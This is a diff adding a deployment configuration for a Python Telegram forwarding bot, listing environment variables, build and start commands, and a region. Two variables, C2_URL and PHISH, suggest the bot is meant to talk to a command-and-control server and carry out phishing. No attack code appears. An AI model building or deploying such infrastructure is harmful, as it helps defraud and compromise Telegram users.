@@ -1,0 +1,36 @@
+services:
+  - type: web
+    name: telegram-fwd-bot
+    runtime: python
+    envVars:
+      - key: API_ID
+        fromFile: true
+        value: .env
+      - key: API_HASH
+        fromFile: true
+        value: .env
+      - key: BOT_TOKEN
+        fromFile: true
+        value: .env
+      - key: ALLOWED_USERS
+        fromFile: true
+        value: .env
+      - key: ENC_KEY
+        fromFile: true
+        value: .env
+      - key: C2_URL
+        fromFile: true
+        value: .env
+      - key: PHISH
+        fromFile: true
+        value: .env
+      - key: MSG_DELAY
+        fromFile: true
+        value: .env
+      - key: MAX_RANGE
+        fromFile: true
+        value: .env
+    buildCommand: pip install -r requirements.txt
+    startCommand: python forwarder_bot.py
+    healthCheckPath: /health
+    region: singapore
